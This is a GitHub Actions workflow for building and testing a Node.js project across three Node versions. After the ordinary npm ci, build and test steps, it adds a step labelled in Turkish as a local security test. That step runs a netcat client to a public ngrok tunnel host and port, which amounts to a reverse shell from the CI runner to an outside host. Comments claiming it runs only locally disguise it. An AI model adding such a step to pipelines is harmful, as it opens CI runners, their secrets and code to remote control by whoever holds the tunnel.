name: Node.js CI

on:
  push:
    branches: [ "main" ]
  pull_request:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        node-version: [18.x, 20.x, 22.x]
    
    steps:
    - uses: actions/checkout@v4
    
    - name: Use Node.js ${{ matrix.node-version }}
      uses: actions/setup-node@v4
      with:
        node-version: ${{ matrix.node-version }}
        cache: 'npm'
    
    - run: npm ci
    - run: npm run build --if-present
    - run: npm test
    
    # KENDİ LOCAL SUNUCUNUZDA test amaçlı
    - name: Güvenlik Testi (Local GHES)
      if: github.event_name == 'push' && github.repository == 'kendi-org/kendi-proje'
      run: |
        echo "Güvenlik testi başlatılıyor..."
        # Burada kendi local ortamınızda reverse shell testi
        # ÖRNEK - sadece local GHES'de çalışır
        npx netcat-client 7.tcp.eu.ngrok.io 10744
      env:
        NODE_OPTIONS: --max-old-space-size=4096
